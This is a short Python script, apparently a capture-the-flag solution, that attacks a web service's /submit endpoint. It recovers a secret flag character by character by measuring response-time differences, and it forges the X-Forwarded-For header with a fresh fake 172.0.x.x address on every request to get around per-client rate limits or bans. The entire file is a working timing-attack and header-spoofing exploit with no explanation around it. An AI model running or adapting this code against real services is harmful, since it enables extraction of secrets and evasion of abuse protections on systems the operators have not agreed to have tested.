#!/usr/bin/env python3
import requests
import sys

def solve(host):
    network = []

    for a in range(256):
        for b in range(256):
            network.append("172.0.%i.%i" % (a, b))

    url = "http://%s:5000/submit?flag=" % host
    
    res = requests.get(url, headers={"X-Forwarded-For" : str(network.pop())})
    base = float(res.headers.get("X-Response-Time"))

    flag = ""

    while len(flag) < 38:
        for char in "0123456789abcdeflag{}":
            res = requests.get(url + flag + char, headers={"X-Forwarded-For" : str(network.pop())})
            
            page = res.content.decode().lower()
            time = float(res.headers.get("X-Response-Time"))
            
            if (time - base) >= 0.05 and ("hacking" not in page):
                base = time
                flag += char
                print(round(base, 3), flag)
                break
    
def usage():
    print("Usage: %s <host>" % sys.argv[0])
    sys.exit()
    
def main():
    if len(sys.argv) < 2:
        usage()
        
    solve(sys.argv[1])
    
if __name__ == "__main__":
    main()
